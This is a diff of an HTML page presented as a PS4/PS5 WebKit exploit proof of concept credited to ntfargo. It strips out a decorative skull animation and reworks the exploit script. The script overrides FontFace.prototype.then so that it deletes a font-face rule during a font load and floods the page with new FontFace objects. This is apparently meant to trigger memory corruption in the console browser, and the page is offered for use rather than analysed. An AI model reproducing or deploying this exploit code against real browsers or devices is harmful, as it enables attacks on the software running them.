@@ -1,84 +1,55 @@
 <!DOCTYPE html>
-<html lang="es">
+<html>
 <head>
     <meta charset="utf-8">
-    <title>PS4/PS5 WebKit Exploit</title>
+    <title>PS4 WebKit Exploit</title>
     <style id="s">
-        @font-face { font-family: x; src: url(nonexistent-font.woff); unicode-range: U+0042; }
+        @font-face { 
+            font-family: x; 
+            src: url(nonexistent.woff); 
+            unicode-range: U+0041-005A; 
+        }
     </style>
     <style>
-        body { margin:0; background:#000; color:#00ff00; font-family:'Courier New', monospace; overflow:hidden; height:100vh; }
-        canvas { position:absolute; top:0; left:0; z-index:1; opacity:0.20; }
-        .content { position:relative; z-index:2; text-align:center; padding-top:80px; }
-        h1 { color:#00ff41; font-size:30px; text-shadow:0 0 15px #00ff41; }
+        body {
+            background: #000;
+            color: #00ff00;
+            font-family: Courier New, monospace;
+            text-align: center;
+            padding-top: 80px;
+        }
+        h1 { color: #00ff41; font-size: 28px; text-shadow: 0 0 10px #00ff41; }
     </style>
 </head>
 <body>
 
-    <canvas id="matrix"></canvas>
-
-    <div class="content">
-        <h1>PS4 / PS5 WebKit Exploit</h1>
-        <p>PoC by <strong>ntfargo</strong></p>
-        <p style="color:#00ff80; margin-top:40px;">Cargando exploit... No cierres esta página</p>
-    </div>
+    <h1>PS4 / PS5 WebKit Exploit</h1>
+    <p>PoC by <strong>ntfargo</strong></p>
+    <p style="color:#00ff80; margin-top:50px;">Cargando exploit... No cierres esta página</p>
 
     <script>
-        // === CALAVERAS CAYENDO ===
-        const canvas = document.getElementById('matrix');
-        const ctx = canvas.getContext('2d');
-        canvas.height = window.innerHeight;
-        canvas.width = window.innerWidth;
-
-        const skulls = ['💀','☠️','🦴','⚰️','☠️'];
-        const fontSize = 28;
-        const columns = canvas.width / fontSize;
-        const drops = Array(Math.floor(columns)).fill(1);
-
-        function draw() {
-            ctx.fillStyle = 'rgba(0,0,0,0.07)';
-            ctx.fillRect(0, 0, canvas.width, canvas.height);
-            ctx.fillStyle = '#00ff41';
-            ctx.font = fontSize + 'px sans-serif';
-
-            for (let i = 0; i < drops.length; i++) {
-                const text = skulls[Math.floor(Math.random() * skulls.length)];
-                ctx.fillText(text, i * fontSize, drops[i] * fontSize);
-                if (drops[i] * fontSize > canvas.height && Math.random() > 0.965) drops[i] = 0;
-                drops[i]++;
-            }
-        }
-        setInterval(draw, 35);
-
-        // === EXPLOIT ORIGINAL (más fuerte) ===
         let fired = false;
 
         Object.defineProperty(FontFace.prototype, 'then', {
             configurable: true,
             get() {
-                if (!fired && this === A) {
+                if (!fired) {
                     fired = true;
-                    new FontFace('y', 'local(Helvetica Bold)', { unicodeRange: 'U+0041' });
-                    new FontFace('z', 'local(Helvetica Italic)', { unicodeRange: 'U+0041' });
                     document.getElementById('s').sheet.deleteRule(0);
+                    for (let i = 0; i < 25; i++) {
+                        new FontFace('y' + i, 'local(Arial)', { unicodeRange: 'U+0041-005A' });
+                    }
                     document.body.offsetTop;
                 }
                 return undefined;
             }
         });
 
-        let A = new FontFace('x', 'local(Helvetica)', { unicodeRange: 'U+0041' });
-        document.fonts.add(A);
-        void A.loaded;
-
         window.onload = () => {
-            document.fonts.load('1em x', 'AB');
+            let A = new FontFace('x', 'local(Helvetica)', { unicodeRange: 'U+0041-005A' });
+            document.fonts.add(A);
+            document.fonts.load('1em x', 'ABCDEFGHIJKLMNOPQRSTUVWXYZ');
         };
-
-        window.addEventListener('resize', () => {
-            canvas.height = window.innerHeight;
-            canvas.width = window.innerWidth;
-        });
     </script>
 </body>
 </html>
